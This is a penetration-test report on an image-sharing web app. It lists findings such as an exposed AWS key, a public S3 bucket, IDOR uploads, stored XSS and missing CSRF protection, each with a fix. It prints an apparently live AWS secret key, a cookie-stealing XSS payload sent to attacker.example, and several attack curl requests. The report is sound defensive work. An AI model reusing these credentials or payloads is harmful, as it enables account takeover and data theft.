# Finding: Hard-coded AWS Access Key and Secret Published in Client-Side JavaScript
Severity: critical
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Affected: https://imagesharer.xyz/js/awsvalid.js  (also served at http://51.161.131.44:8080/js/awsvalid.js)
References:
- OWASP A05:2021 Security Misconfiguration
- OWASP A07:2021 Identification and Authentication Failures
- CWE-798 Use of Hard-coded Credentials
- CWE-540 Inclusion of Sensitive Information in Source Code
- AWS Best Practices: Managing Access Keys for IAM Users

Summary:
The file /js/awsvalid.js is served publicly by the web server and contains, in a plain-text comment block, a live AWS access key ID (starting with AKIA...), a matching secret access key, and the region ap-southeast-2. The same access key ID appears later in the application's presigned S3 URLs, proving that these are the live production credentials used by the Imagur application to store customer images. Anyone in the world who visits that URL - unauthenticated, no browser interaction required - obtains full working AWS credentials for the Imagur AWS account.

Description:
The JavaScript file (5,298 bytes) begins with:

    // Testing to see if the endpoint is connectable
    // Try this
    /*
    AKIAQHQ6PGM62T2FFPGU
    c7njNpv1oT3rhBhUHue2e2d+oIFnw7QDgCmTtPCG
    ap-southeast-2
    */

followed by a full AWS SigV4 GetCallerIdentity implementation. During upload testing we confirmed that the application's presigned S3 URLs are signed with the same access key ID (AKIAQHQ6PGM62T2FFPGU) and region (ap-southeast-2), for example:
    https://filesharer-research.s3.ap-southeast-2.amazonaws.com/users/<uuid>/<uuid>.png?X-Amz-Credential=AKIAQHQ6PGM62T2FFPGU%2F20260918%2Fap-southeast-2%2Fs3%2Faws4_request&X-Amz-Signature=...

An attacker who obtains this key can, at minimum, exercise every permission granted to that IAM principal against every AWS API in the account. Given the URL structure (all user images are stored in a single S3 bucket named filesharer-research and the presigned URL is generated by the same key), an attacker will minimally have full read/write/delete access to the bucket containing every user's images (public and private) and every avatar. Depending on the IAM policy attached to this user, they may also be able to escalate to other AWS services (STS, IAM, RDS, etc.). This assessment did not use or validate the credentials against AWS per engagement rules; the exposure alone is proven and is a Critical breach.

Business impact:
- Complete compromise of the AWS account that hosts customer data.
- Ability to read, modify, or destroy every uploaded image from every user, including images the users explicitly marked as Private.
- Ability to plant illegal or misleading content into user accounts (further amplified by the IDOR finding below).
- Potential unbounded AWS billing exposure if the key has permissions to spin up compute.
- Reputational damage and mandatory breach notification obligations under Australian Privacy Principles once any user data is confirmed to have been accessed.

Recommendation:
1. Immediately rotate the exposed credentials. In the AWS Console: IAM -> Users -> select the user that owns AKIAQHQ6PGM62T2FFPGU -> Security credentials -> Delete the access key. Generate a replacement only if strictly needed.
2. Review AWS CloudTrail for the last 30 days for any GetCallerIdentity, ListBucket, GetObject, PutObject, or STS AssumeRole calls originating from IPs other than the OVH VPS (51.161.131.44). Assume compromise if any anomalous activity appears.
3. Remove /js/awsvalid.js from the web root; if it was a leftover debugging file, delete it. It is not referenced by any live page (the <script src> tag is commented out).
4. Move AWS credentials to server-side configuration (environment variables loaded by PHP-FPM, or better, an IAM role attached to the VPS via AWS IAM Roles Anywhere / EC2 instance profile if the VPS is migrated to EC2).
5. Apply least-privilege to the replacement key: grant only s3:PutObject, s3:GetObject, and s3:DeleteObject on the specific bucket and key prefix, nothing else.
6. Add a pre-commit / CI secret scanner (e.g., gitleaks, trufflehog) to prevent recurrence.

# Finding: S3 Bucket "filesharer-research" Allows Anonymous Read and Anonymous Object Listing
Severity: critical
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Affected: https://filesharer-research.s3.ap-southeast-2.amazonaws.com/ (the S3 bucket that stores all user images and avatars for imagesharer.xyz)
References:
- OWASP A01:2021 Broken Access Control
- OWASP A05:2021 Security Misconfiguration
- CWE-284 Improper Access Control
- CWE-732 Incorrect Permission Assignment for Critical Resource
- AWS Best Practices: Blocking Public Access to Your Amazon S3 Storage

Summary:
The S3 bucket that backs Imagur (filesharer-research in ap-southeast-2) is configured to allow anonymous ListBucket and anonymous GetObject on every stored object. Any person on the internet - with no AWS account and no credentials - can list every user's images and download every image directly, completely bypassing the application's "Private" visibility control. This means the application-layer "Private" toggle provides no confidentiality guarantee whatsoever.

Description:
Two direct, unauthenticated proofs were captured from this workstation:

1) Anonymous list of the bucket returns HTTP 200 and an XML page of keys:
    curl -sk "https://filesharer-research.s3.ap-southeast-2.amazonaws.com/?list-type=2&max-keys=1"
    HTTP 200
    <ListBucketResult ...>
        <Name>filesharer-research</Name>
        <IsTruncated>true</IsTruncated>
        <NextContinuationToken>...</NextContinuationToken>
        <Contents><Key>users/'/a5cebccb-38ec-4d85-bb6c-468875f9e686.png</Key> ... </Contents>
    </ListBucketResult>
   The IsTruncated=true and continuation token indicate the bucket contains many additional keys that can be enumerated by simply following the continuation token.

2) Anonymous GET on a specific image (owned by our test account, marked "Private" in the app) returns HTTP 200 and the actual PNG binary:
    curl -sk -I "https://filesharer-research.s3.ap-southeast-2.amazonaws.com/users/44438961-87de-4aaa-9930-e20a2b5e7ef8/74a461ef-4b81-43e1-8ce0-3c0e10ac4859.png"
    HTTP/1.1 200 OK
    Content-Type: image/png

   Downloading the object returned a valid 312-byte PNG - the exact image uploaded through the "Private" flow.

The application UI shows presigned URLs with 15-minute expirations, giving the appearance that access is time-limited and authorised. In reality the S3 layer serves the object unconditionally to anyone.

Business impact:
- Complete privacy breach: every image any user has ever uploaded to Imagur is downloadable by anyone. This includes anything a user marked "Private (only you)".
- Enumeration of the bucket reveals the URL structure users/<user_uuid>/<image_uuid>.png, which further leaks how many users exist and how many images each user has uploaded.
- Under the Australian Privacy Act 1988 and the Notifiable Data Breaches scheme, this is a reportable breach the moment personal or sensitive images are involved.
- Reputational impact: the product's core value proposition ("your images, your control") is invalidated by this misconfiguration.

Recommendation:
1. In the AWS Console -> S3 -> filesharer-research bucket, enable "Block all public access" for both the bucket and account.
2. Remove any Bucket Policy or ACL that grants Principal "*" or the AllUsers group any permission.
3. Have the PHP application generate presigned URLs (which it already does) and rely on the presigned URL for read access. Never expose the raw S3 object URL to end users.
4. Consider moving to CloudFront + Origin Access Control so that S3 only accepts signed requests from CloudFront and the presigned URL is short-lived.
5. Trigger AWS Macie or S3 Inventory to enumerate what has already been exposed, and issue any legally required breach notifications for affected users.

# Finding: Broken Access Control on Image Upload - Client-Controlled user_id Allows Planting Content in Any User's Account
Severity: high
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L
Affected: POST https://imagesharer.xyz/images/upload (and the same route on port 8080)
References:
- OWASP A01:2021 Broken Access Control
- OWASP API1:2023 Broken Object Level Authorization
- CWE-284 Improper Access Control
- CWE-639 Authorization Bypass Through User-Controlled Key

Summary:
The image upload form on /images/upload contains a hidden <input name="user_id"> that is trusted by the server. Any authenticated user can submit an upload request where user_id contains a different account's UUID, and the server will store the uploaded image under that other user's ownership. The image appears in the victim's dashboard as if the victim uploaded it. This lets an attacker plant arbitrary image content in any user's account (including illegal, defamatory, or otherwise malicious material).

Description:
The rendered upload form for our test account A includes:
    <input type="hidden" name="user_id" value="44438961-87de-4aaa-9930-e20a2b5e7ef8">

Sending this request from account A (using A's session cookie) but setting user_id to account B's UUID:

    curl -k -b cookies-A.txt -X POST https://imagesharer.xyz/images/upload \
        -F "user_id=16ffaff0-cec0-4cc6-9c4a-dbb6dbe0b40d" \
        -F "is_public=false" \
        -F "file=@tinyA.png;type=image/png"

resulted in HTTP 302 Location: /images/b0c9c911-d750-4a6a-9e8c-286276e213bf. When we then loaded account B's dashboard, the new image was present:
    <p class="text-muted mb-2">1 image</p>
    <a href="/images/b0c9c911-d750-4a6a-9e8c-286276e213bf"> ...
    src="https://filesharer-research.s3.ap-southeast-2.amazonaws.com/users/16ffaff0-cec0-4cc6-9c4a-dbb6dbe0b40d/b0c9c911-....png?..."
    <span class="filename">tinyA.png</span>

The image is stored inside B's S3 folder (users/16ffaff0.../), attributed to B in the database, and rendered as B's own image on B's dashboard.

Because user UUIDs are printed on each user's own /profile page, an attacker who knows or guesses a target user's UUID (see finding on UUID exposure below) or who obtains any user's UUID by other means can silently upload arbitrary content into that user's account. The visibility toggle (Private/Public) also honours the field submitted with the upload, so the attacker can plant public, indexable content under the victim's identity.

Business impact:
- An attacker can seed a victim's account with illegal or defamatory content, then trigger take-down complaints, extortion, or reputational harm against the victim.
- Storage quotas of victims can be exhausted.
- Under Australian consumer and privacy law the platform is liable for content it displays as belonging to a user; the platform effectively cannot prove that user X uploaded image Y.
- Chains with the Stored XSS finding below to permit an attacker to execute JavaScript in the victim's browser session simply by getting them to view "their" own image.

Recommendation:
1. Remove the user_id field from the client form completely. Derive the owning user's ID exclusively from the server-side session (the value already held for the authenticated user).
2. On the /images/upload backend handler, ignore any client-supplied user_id input.
3. Add server-side authorisation logic: reject requests whose derived user_id does not match the session's authenticated user_id.
4. Add logging on every upload that records the authenticated user_id and refuses (and alerts on) any mismatch attempt.

# Finding: Entire Application Also Served Over Cleartext HTTP on Port 8080
Severity: high
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
Affected: http://51.161.131.44:8080/ (Apache 2.4.68) - serves the same "Imager" application against the same database.
References:
- OWASP A02:2021 Cryptographic Failures
- CWE-319 Cleartext Transmission of Sensitive Information

Summary:
Port 8080/tcp on the origin server hosts a second, cleartext-HTTP copy of the exact same application backed by the same database as the HTTPS site on 443. Registration and login on 8080 succeed using the same account credentials as the main site, and session cookies (PHPSESSID) are transmitted in plain text. Any passive attacker on the network path (e.g., open Wi-Fi, ISP-level MITM, malicious proxy) can capture credentials or session cookies and take over accounts. It also weakens the site's overall security posture because it presents a downgraded copy of the app that undermines HTTPS.

Description:
Nmap version detection identified port 8080/tcp as Apache/2.4.68 (Debian) running the same PHP 8.2.33 application. Sending A's real registered credentials to http://51.161.131.44:8080/login (with Host: imagesharer.xyz) responded HTTP 302 Location: /dashboard and set PHPSESSID as a new authenticated session - proving both ports share the same backend database and authentication store. The same missing cookie attributes described in the "Insecure Session Cookie" finding apply on 8080 as well, so the PHPSESSID cookie is emitted (and would be sent back) over cleartext HTTP.

The application does not enforce HTTPS via HSTS, so a user pointed to imagesharer.xyz:8080 or 51.161.131.44:8080 will complete the entire authentication flow in plaintext. There is no user-facing reason for this alternate port to exist.

Business impact:
- Passive interception of user credentials and session cookies wherever the user's traffic transits an untrusted network.
- Session hijacking leading to full account takeover.
- Regulatory exposure under the Australian Notifiable Data Breach scheme if credentials are captured.

Recommendation:
1. Firewall port 8080/tcp closed to the internet (only allow localhost or an internal management CIDR). On the OVH VPS this can be done via `ufw deny 8080/tcp` or the OVH VPS firewall control panel.
2. If port 8080 is not needed at all, stop and disable the Apache service and remove it from boot: `systemctl disable --now apache2`.
3. If a second web server is required (e.g., health checks), bind it to 127.0.0.1 only in `/etc/apache2/ports.conf` (`Listen 127.0.0.1:8080`).
4. Add HSTS on the HTTPS site: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` so browsers refuse to downgrade to HTTP for imagesharer.xyz.

# Finding: PostgreSQL Database Listens Directly on the Public Internet (5432/tcp)
Severity: high
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Affected: 51.161.131.44:5432/tcp
References:
- OWASP A05:2021 Security Misconfiguration
- CWE-284 Improper Access Control
- CIS PostgreSQL Benchmark 2.x, section 3 (Networking)

Summary:
PostgreSQL is listening on the public IP of the production VPS with no network-level access control. Anyone on the internet can complete a TCP handshake to the database engine and negotiate the PostgreSQL wire protocol. Although we did not attempt any credentials, direct exposure of the database dramatically increases the risk of brute-force, known-CVE exploitation, and pre-auth denial-of-service against the database engine.

Description:
A full-port TCP scan of the origin identified port 5432/tcp open. A follow-up `nmap -sV` confirmed the service as "PostgreSQL DB" answering with the PostgreSQL protocol handshake ("Unsupported frontend protocol" error typical for non-libpq clients). We did not attempt any real credentials per engagement rules; only a protocol-level probe. The database is the same instance backing the "Imager" application (evidenced by identical UUIDs and the SQL error disclosure finding).

Business impact:
- A single leaked password (e.g., via the AWS-key finding, a stolen backup, or brute-force) directly compromises the primary customer database from anywhere on the internet.
- Exposure to PostgreSQL server-side CVEs the moment one is disclosed.
- Increases blast radius of any credential leak - locally accessible databases require an additional step (RCE, VPN foothold, etc.) that a public-facing database removes.

Recommendation:
1. Bind PostgreSQL to localhost only. Edit /etc/postgresql/*/main/postgresql.conf and set `listen_addresses = 'localhost'`, then restart the service.
2. If external access is truly required for administration, restrict it via OVH VPS firewall or `ufw allow from <admin-ip> to any port 5432 proto tcp`.
3. Ensure pg_hba.conf disallows password authentication from any non-local network and requires scram-sha-256.
4. Confirm the DB is on a recent PostgreSQL 15 or 16 with all security patches applied.
5. Add fail2ban rules against the PostgreSQL log for repeated authentication failures.

# Finding: Session Cookie PHPSESSID Missing HttpOnly, Secure, and SameSite Attributes
Severity: medium
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
Affected: All authenticated pages under https://imagesharer.xyz and http://51.161.131.44:8080
References:
- OWASP A05:2021 Security Misconfiguration
- OWASP Session Management Cheat Sheet
- CWE-1004 Sensitive Cookie Without 'HttpOnly' Flag
- CWE-614 Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

Summary:
The application sets the PHPSESSID session cookie without HttpOnly, Secure, or SameSite attributes. This means (a) any client-side JavaScript, including the stored XSS payload confirmed elsewhere in this report, can steal the session token, (b) the cookie is transmitted over the cleartext HTTP port 8080 with no browser protection, and (c) it can be sent on cross-site requests, enabling CSRF. Combined with the stored XSS finding, this yields full account takeover from a single click.

Description:
Every response that sets the session cookie shows attributes such as:
    Set-Cookie: PHPSESSID=52f835430fc750a906621ad0b6127d9e; path=/

with no HttpOnly, no Secure, and no SameSite. By contrast the application's own auxiliary cookies (last_login, page_views) do get the full flag set - so the framework is capable of setting them; the PHPSESSID configuration is the specific gap. Rotation of the session ID on login works correctly (verified by comparing pre-login and post-login PHPSESSID values), which is a positive.

Business impact:
- One line of injected JavaScript (document.cookie is enough) exfiltrates the session and grants the attacker full authenticated access.
- Any browser that visits port 8080 leaks the cookie over the wire.

Recommendation:
1. Configure PHP to set the cookie with security flags. In /etc/php/8.2/*/php.ini or in the application bootstrap:
       session.cookie_httponly = 1
       session.cookie_secure   = 1
       session.cookie_samesite = "Lax"
       session.use_strict_mode = 1
2. Optionally call `session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Lax'])` before session_start() in the app bootstrap.
3. After the port 8080 finding is remediated, promote SameSite to `Strict` for even stronger CSRF resistance.

# Finding: Stored Cross-Site Scripting via Image Filename on Image Detail Page
Severity: medium
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Affected: https://imagesharer.xyz/images/<image_uuid>  (server-rendered image detail page)
References:
- OWASP A03:2021 Injection
- OWASP XSS Prevention Cheat Sheet
- CWE-79 Improper Neutralization of Input During Web Page Generation

Summary:
When a user uploads an image, the original filename supplied in the multipart form is stored and later rendered unescaped inside the "Filename" row on the image detail page. Supplying a filename containing HTML/JavaScript results in that HTML being executed in the browser of anyone who opens the image detail page - which includes the owner (or, via the IDOR upload finding, another user for whom the attacker planted the image). Combined with the missing HttpOnly on PHPSESSID, this permits stealing the session cookie and taking over the account.

Description:
We uploaded an image using a payload filename:
    file=@tinyA.png;filename=<img src=x onerror=alert(1)>.png

The resulting HTTP 302 Location: /images/a8dec603-a18d-4e7e-bdb4-24db1f40be4a redirected us to the image detail page. In that page:
- The <title> and <h1> are correctly HTML-escaped: `&lt;img src=x onerror=alert(1)&gt;.png`
- The "Filename" row is NOT escaped:

        <div class="meta-row">
            <span>Filename</span>
            <span><img src=x onerror=alert(1)>.png</span>
        </div>

A browser renders this as an actual <img> tag with an onerror handler that executes attacker-supplied JavaScript. Because the app has no Content-Security-Policy header and PHPSESSID has no HttpOnly attribute, the payload can trivially exfiltrate the session cookie.

Chained scenario:
1. Attacker learns victim's UUID from the site (public profile pages, or via other side channels).
2. Attacker uploads a small PNG on the victim's behalf via the IDOR upload (finding above), with filename `<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>.png`.
3. Victim opens their dashboard, clicks the mysterious new image (whose filename displays as the payload text), the payload executes, the session cookie is sent to the attacker, and the attacker takes over the account.

Business impact:
- Account takeover of any user for whom the attacker can plant an image (which, per the IDOR finding, is any user whose UUID they know).
- Ability to modify or delete legitimate user content, change email, etc.
- Reputational and legal exposure identical to a data breach.

Recommendation:
1. HTML-escape the filename in every location it is rendered. The template already escapes it in <title> and <h1>; extend the same helper to the Filename meta-row and the image `alt` attribute (which is also unescaped in the raw HTML).
2. Enforce a strict server-side filename sanitizer that only permits [A-Za-z0-9._-] and truncates to a reasonable length before storing.
3. Add a Content-Security-Policy header such as `default-src 'self'; img-src 'self' https://*.s3.ap-southeast-2.amazonaws.com; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'` to sharply reduce the impact of any residual XSS.

# Finding: Verbose Error Messages Reveal Server File Paths, Framework Structure, and Database Type
Severity: medium
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
Affected: POST https://imagesharer.xyz/images/upload  (and probably any other endpoint that receives malformed input)
References:
- OWASP A05:2021 Security Misconfiguration
- CWE-209 Generation of Error Message Containing Sensitive Information
- CWE-497 Exposure of Sensitive System Information to an Unauthorized Control Sphere

Summary:
When the application receives an input value that fails a database type constraint, it returns a JSON error containing the raw PostgreSQL SQLSTATE code, the malformed parameter value, and the absolute file path of the source file that issued the query. This gives an attacker a free map of the server-side technology stack and the internal application structure.

Description:
Sending an invalid UUID in the user_id field:
    curl -k -b cookies-A.txt -X POST https://imagesharer.xyz/images/upload \
        -F "user_id='; DROP TABLE users; --" \
        -F "file=@tinyA.png;type=image/png"

returned:
    {"error":{"code":"INTERNAL_ERROR","message":"An unexpected error occurred.",
      "detail":"SQLSTATE[22P02]: Invalid text representation: 7 ERROR:  invalid input syntax for type uuid: \"'\"\n
      CONTEXT:  unnamed portal parameter $2 = '...' in /var/www/html/src/modules/images/ImagesService.php:71"}}

From that single response an attacker learns:
- The database is PostgreSQL (SQLSTATE format).
- Prepared statements are used correctly (parameter $2) - a defensive positive, but visible.
- The application root on disk is /var/www/html.
- The source tree uses a modular structure under src/modules/, with images handled by ImagesService.php.
- The line number of the vulnerable-looking query (line 71).

This same shape of error is likely to surface for any parameter that fails a DB type or constraint check.

Business impact:
- Provides low-effort reconnaissance to any attacker probing the site.
- Reduces the time cost of chaining an unrelated bug into RCE or a targeted exploit.
- Historically a common precursor to full compromise.

Recommendation:
1. Turn off `display_errors` in php.ini for the production SAPI (already off in most cases; verify).
2. Catch database exceptions in a top-level middleware and return a generic error identifier while logging the details server-side. Something like:
       {"error":{"code":"INTERNAL_ERROR","reference":"<random-uuid>"}}
   and log the SQLSTATE + trace under that reference.
3. Never include CONTEXT/parameter values or file paths in the client response.

# Finding: No CSRF Protection on Any State-Changing Form
Severity: medium
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L
Affected: POST /register, POST /login, POST /logout, POST /images/upload, POST /images/<id>/visibility, POST /images/<id>/delete, POST /profile/avatar
References:
- OWASP A01:2021 Broken Access Control
- OWASP CSRF Prevention Cheat Sheet
- CWE-352 Cross-Site Request Forgery

Summary:
None of the application's state-changing forms carry a CSRF token or reference a per-session anti-CSRF value. Combined with the session cookie carrying `SameSite=Lax` (not Strict) and, on port 8080, no SameSite at all, an attacker can craft a malicious page that causes a victim's browser to submit forms to imagesharer.xyz using the victim's cookies.

Description:
Every authenticated form in the application HTML is emitted without a hidden anti-forgery token. Examples from the captured pages:

    <form method="POST" action="/logout"> ... </form>
    <form method="POST" action="/images/upload" enctype="multipart/form-data"> ... </form>
    <form method="POST" action="/images/<uuid>/visibility"> <input type="hidden" name="is_public" value="true"> ... </form>
    <form method="POST" action="/images/<uuid>/delete"> ... </form>
    <form method="POST" action="/profile/avatar" enctype="multipart/form-data"> ... </form>

While server-side access control does prevent one user's session from acting on another user's resource, the attacker can still force actions on the victim's OWN account (log them out, change avatar to something offensive, toggle their private images to public, or - via the IDOR upload - upload arbitrary content into their account). Auto-uploads via multipart forms from another origin are practical because SameSite=Lax permits top-level GET/POST navigations initiated by user clicks.

Business impact:
- Attacker phishing/link-baiting can force a logged-in user to log out (annoyance), flip Private images to Public (privacy breach), or upload attacker-chosen content (chained with IDOR).
- Cross-site request forgery is one of the OWASP Top 10 categories most consistently flagged by external auditors and bug bounty triagers.

Recommendation:
1. Implement the synchronizer token pattern: generate a cryptographically random token, store in server session, embed as a hidden input in every form, and validate on every state-changing request.
2. Emit a corresponding X-CSRF-Token header for AJAX requests.
3. Set the session cookie to SameSite=Strict (requires the port 8080 issue to be closed first because Strict blocks cross-origin scenarios).
4. Optionally validate that the Origin/Referer header of state-changing requests matches https://imagesharer.xyz.

# Finding: No Rate Limiting on Login Endpoint
Severity: medium
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Affected: POST https://imagesharer.xyz/login
References:
- OWASP A07:2021 Identification and Authentication Failures
- CWE-307 Improper Restriction of Excessive Authentication Attempts
- OWASP Authentication Cheat Sheet

Summary:
The login endpoint responds identically to any number of consecutive failed login attempts from the same IP with no throttling, no CAPTCHA, and no lockout. This makes online password brute-force and credential stuffing practical, especially since the app also leaks account existence via response timing (see next finding).

Description:
We issued ten consecutive login attempts with clearly failing credentials in 0.5 second intervals from a single IP. All ten received HTTP 302 in 114 to 127 milliseconds:
    attempt=1 HTTP=302 time=0.115s
    attempt=2 HTTP=302 time=0.126s
    ...
    attempt=10 HTTP=302 time=0.120s
No account lockout was triggered on the test account either.

Because the target's users pick their own passwords (registration allows a single-character password `a`, so we know password complexity is not enforced by the app), the site is a soft target for password guessing at scale.

Business impact:
- Attackers can perform credential stuffing (trying leaked email/password pairs from third-party breaches) trivially.
- Even a modest 5,000-request attack from a residential proxy pool can compromise weak-password accounts within minutes.

Recommendation:
1. Enforce per-account and per-IP throttling on /login (e.g., 5 failed attempts per account per 15 minutes, 20 failed attempts per IP per 15 minutes). PHP libraries such as `pgsql`-backed rate limiters or a fronting fail2ban rule work.
2. Add a CAPTCHA (hCaptcha, Turnstile) after the first N failures.
3. Enforce a real password policy at registration (minimum 8-10 characters, block top-10000 common passwords). Currently a 1-character password is accepted.
4. Consider adding "have i been pwned" k-anonymity checks at registration/password-change time.

# Finding: Username Enumeration on /login via Response-Time Side Channel
Severity: low
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Affected: POST https://imagesharer.xyz/login
References:
- OWASP A07:2021 Identification and Authentication Failures
- CWE-203 Observable Discrepancy
- OWASP Authentication Cheat Sheet - Preventing account enumeration

Summary:
The /login endpoint returns the same HTTP status and identical (empty) response body whether or not the submitted email address exists, but the server takes approximately four times as long to answer for an email that IS in the database. An attacker can therefore reliably determine whether an arbitrary email address has an account on Imagur by measuring response time alone.

Description:
Two directly comparable requests:
- Existing email + wrong password:      HTTP=302, time=0.529s
- Non-existent email + any password:     HTTP=302, time=0.122s

The response body is 0 bytes for both, and the redirect is /login in both. Only the time-to-first-byte differs, consistently over multiple attempts (roughly 4.3x slower for existing accounts). This is the classic signature of a code path that hashes+compares the password only when a user row is found (the bcrypt work factor dominates the response time).

Business impact:
- An attacker can enumerate which email addresses have Imagur accounts. Useful for targeted phishing, credential stuffing, and reconnaissance.
- Privacy: a third party can confirm whether a given individual has an Imagur account.

Recommendation:
1. Always perform a constant-time password verification, even when no user row was found. Compare against a fixed dummy hash so the cost is paid regardless of email validity.
2. Introduce a small deliberate delay (~250 ms) or, better, ensure both branches perform equivalent work.
3. Also apply the same treatment to /register: registering with an email that already exists should not respond in a distinguishable way (currently the request returns 302 too, but the failure state is confusable).

# Finding: Missing Strict-Transport-Security, Content-Security-Policy, and Permissions-Policy Response Headers
Severity: low
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N
Affected: All responses from https://imagesharer.xyz
References:
- OWASP A05:2021 Security Misconfiguration
- OWASP Secure Headers Project
- Mozilla Observatory

Summary:
The site sets a good baseline of legacy headers (X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy) but omits three modern hardening headers - HSTS, CSP, and Permissions-Policy. Their absence enables HTTPS downgrade attacks, magnifies the impact of any XSS (including the stored XSS confirmed above), and permits use of powerful browser features from any script the site loads.

Description:
Response header on / and /login (both HTTPS):
    Server: nginx
    X-Content-Type-Options: nosniff
    X-Frame-Options: DENY
    X-XSS-Protection: 1; mode=block
    Referrer-Policy: strict-origin-when-cross-origin
    (no Strict-Transport-Security, no Content-Security-Policy, no Permissions-Policy)

Recommendation:
1. Add `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (once port 8080 is closed off).
2. Add `Content-Security-Policy: default-src 'self'; img-src 'self' https://filesharer-research.s3.ap-southeast-2.amazonaws.com; style-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'`.
3. Add `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()` (adjust based on features you actually use).
4. Consider `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-site`.

# Finding: Client-Side Cookies Store Server-Consumed State (page_views, last_login)
Severity: low
CVSS: 
Affected: Cookies `page_views` and `last_login` set on all users after login/registration.
References:
- OWASP A08:2021 Software and Data Integrity Failures
- CWE-565 Reliance on Cookies without Validation and Integrity Checking

Summary:
The application persists behavioural / auditing state in client-side cookies (URL-encoded JSON containing user_agent, referer, timestamp, session_id, and a page-view history). If the server ever consumes any field of these cookies (e.g., for analytics dashboards, admin views, or automated actions), a client-side attacker can forge arbitrary values. Even without a confirmed downstream sink this pattern is a design smell.

Description:
Observed cookies after login:
    Set-Cookie: last_login={"timestamp":1789706373,"session_id":"52f835430...","user_agent":"curl/8.21.0"}; ...
    Set-Cookie: page_views=[{"page":"auth/login","timestamp":...,"user_agent":"curl/8.21.0","referer":""}]; ...

Both cookies have Secure, HttpOnly, SameSite=Lax (good), but they contain server-echoable values that a browser cannot influence but a determined attacker (via a compromised proxy, a browser extension, or a direct crafted request) can. If any admin dashboard renders these values back to a staff member, they become a stored XSS vector against staff.

Business impact:
Contingent on whether the server side reads these cookies for anything other than display to the same user. If it does, session-id spoofing or stored XSS against admins is possible.

Recommendation:
1. Do not use client-side cookies for behavioural or audit data. Persist that data server-side keyed off the session.
2. If retained, apply strict server-side validation before any use (JSON schema, UUID validation, length caps, HTML-escape on render).
3. Consider signing the cookie value (HMAC) so tampering is detectable.

# Finding: SPF, DKIM, and DMARC Records Absent for imagesharer.xyz
Severity: low
CVSS: 
Affected: DNS zone imagesharer.xyz
References:
- RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
- Australian ACSC Guidance on Email Authentication

Summary:
The domain imagesharer.xyz publishes no MX, SPF, DKIM, or DMARC records. Since the domain itself does not currently send email, a spammer or phisher can freely spoof `From: something@imagesharer.xyz` in emails to any third party, and receiving mail servers have nothing to reject the message against. This is easy to fix and prevents future brand-impersonation phishing against your users.

Description:
DNS queries for imagesharer.xyz return no TXT records containing v=spf1 or v=DMARC1 and no MX record.

Recommendation:
Publish a null MX and a rejecting SPF/DMARC:
    imagesharer.xyz.        IN MX    0 .
    imagesharer.xyz.        IN TXT   "v=spf1 -all"
    _dmarc.imagesharer.xyz. IN TXT   "v=DMARC1; p=reject; rua=mailto:security@<your-monitored-domain>"

# Finding: Weak Password Policy at Registration
Severity: low
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
Affected: POST https://imagesharer.xyz/register
References:
- OWASP A07:2021 Identification and Authentication Failures
- NIST SP 800-63B

Summary:
The server accepts a single-character password (`a`) at registration despite the client-side minlength=8 attribute. This confirms client-side-only password validation, which is trivially bypassed by anyone sending a raw HTTP request.

Recommendation:
1. Enforce server-side password minimum length (>= 10 characters recommended).
2. Reject known-compromised passwords using an offline breach list or the HIBP k-anonymity API.
3. Do not enforce arbitrary composition rules (they harm usability without improving security).
